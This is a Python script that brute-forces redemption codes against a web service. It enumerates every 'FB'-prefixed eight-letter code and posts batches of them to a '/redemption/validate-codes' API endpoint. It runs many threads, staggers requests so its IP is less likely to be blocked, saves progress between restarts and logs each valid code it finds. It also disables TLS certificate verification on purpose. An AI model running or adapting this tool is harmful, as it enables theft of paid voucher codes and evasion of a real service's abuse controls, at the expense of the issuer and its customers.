import http.client
import os
import ssl
import json
import queue
import pickle
import threading
import time
import sys

max_number_of_threads = int(os.environ["MAX_NUMBER_OF_THREADS"])
staggered_thread_launch_delay = float(os.environ["STAGGERED_THREAD_LAUNCH_DELAY"])
estimated_codes_per_second = int(os.environ["ESTIMATED_CODES_PER_SECOND"])
codes_per_thread = int(max_number_of_threads * staggered_thread_launch_delay * estimated_codes_per_second)
pickle_interval = int(os.environ["CHECKPOINT_INTERVAL"])
output_file_location = "output"
url = os.environ["URL"]


def _decompose(number):
    """Generate digits from `number` in base alphabet, least significants
    bits first.
    """

    while number:
        number, remainder = divmod(number - 1, 26)
        yield remainder


def base_10_to_alphabet(number):
    """Convert a decimal number to its base alphabet representation"""

    return ''.join(
            chr(ord('A') + part)
            for part in _decompose(number)
    )[::-1]


def check_codes(code_list):
    """
        Fix for the ssl error of the request library.
        This leaves us open to be Man-in-th-middled.
        However, for the purpose oft this application, this does not matter :)
        """
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        # Legacy Python that doesn't verify HTTPS certificates by default
        pass
    else:
        # Handle target environment that doesn't support HTTPS verification
        ssl._create_default_https_context = _create_unverified_https_context

    conn = http.client.HTTPSConnection(url)

    data = json.dumps({
        "codes": code_list
    })

    headers = {
        'Content-Type': 'application/json;charset=UTF-8',
        'Host': url,
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Length': str(len(data)),
        'Connection': 'keep-alive'
    }

    response_data = None
    try:
        conn.request("POST", "/api/de_DE/redemption/validate-codes", data, headers)
        res = conn.getresponse()
        response_data = res.read()

        valid_codes = []
        for code_response in json.loads(response_data)["result"]:
            if code_response["status"] == "Valid":
                valid_codes.append(code_list[code_response["item"]])

        return valid_codes

    # non 200 response or no response, exit the program
    except Exception as ex:
        print("Exception: " + str(ex))
        print(response_data)
        return None


class MinerThread(threading.Thread):
    def __init__(self, queue, start_index):
        threading.Thread.__init__(self)
        self.start_index = start_index
        self.queue = queue

    def run(self):
        start = time.time()
        codes = ["FB" + "".join(base_10_to_alphabet(i)) for i in range(self.start_index, self.start_index+codes_per_thread)]
        self.queue.put((self.start_index, check_codes(codes)))
        end = time.time()
        print("Codes per Second: " + str(codes_per_thread/(end-start)))


class Context:
    def __init__(self):
        self.next_index = 8353082583  # AAAAAAAA as a starting point
        self.last_pickled_index = self.next_index
        self.running_indices = []
        self.valid_codes = []
        self.restart_indicies = []

    def is_not_finished(self):
        # are there still ranges to check and/or are there still unfinished threads?
        return self.next_index <= 8353082583*26 or len(self.running_indices) != 0 or len(self.restart_indicies) != 0


if __name__ == '__main__':

    # Shared between the threads to return their results to the main thread
    shared_queue = queue.Queue()

    # see if there already is data from previous runs
    try:
        ctx = pickle.load(open(output_file_location + "/progress.pickle", "rb"))
        ctx.restart_indicies = ctx.restart_indicies + ctx.running_indices.copy()
        ctx.running_indices = []

    # if not, create a new context
    except (OSError, IOError) as e:
        ctx = Context()
        pickle.dump(ctx, open(output_file_location + "/progress.pickle", "wb"))

    while ctx.is_not_finished():
        while len(ctx.running_indices) < max_number_of_threads:

            index = 0

            # if there are threads that did not finish in the last run, recheck their index range
            if ctx.restart_indicies:
                index = ctx.restart_indicies.pop()
                print("Restarting Thread for " + str(index) + " - " + str(index + codes_per_thread))
            else:
                index = ctx.next_index
                print("Starting Thread for " + str(ctx.next_index) + " - " + str(ctx.next_index+codes_per_thread))
                ctx.next_index += codes_per_thread

            thread = MinerThread(shared_queue, index)
            thread.start()
            ctx.running_indices.append(index)

            # do not send all requests at once, otherwise the chance of our IP being blocked is higher
            time.sleep(staggered_thread_launch_delay)

        (thread_index, values) = shared_queue.get()

        # if a thread did not get a 200, stop the program. Docker will take care of restarting it later.
        if values is None:
            pickle.dump(ctx, open(output_file_location + "/progress.pickle", "wb"))
            print("Thread returned None, stopping")
            sys.exit(1)

        ctx.valid_codes.extend(values)
        ctx.running_indices.remove(thread_index)

        # every time 'pickle_intervall' codes are checked, save the current progress
        if ctx.running_indices and min(ctx.running_indices) >= ctx.last_pickled_index + pickle_interval:
            print("Progress: " + str(((min(ctx.running_indices)-8353082583)/(8353082583*25))*100) + "% done")
            pickle.dump(ctx, open(output_file_location + "/progress.pickle", "wb"))
            ctx.last_pickled_index = min(ctx.running_indices)

        print("Checked range " + str(thread_index) + " - " + str(thread_index+codes_per_thread))
        print("Running threads: " + str(len(ctx.running_indices) - shared_queue.qsize()) + " of " + str(max_number_of_threads))

        # safe valid codes to the output file
        for value in values:
            with open(output_file_location + '/codes.txt', 'a') as f:
                f.write(value + "\n")
            print("!!!!!!!! Found Code: " + str(value))



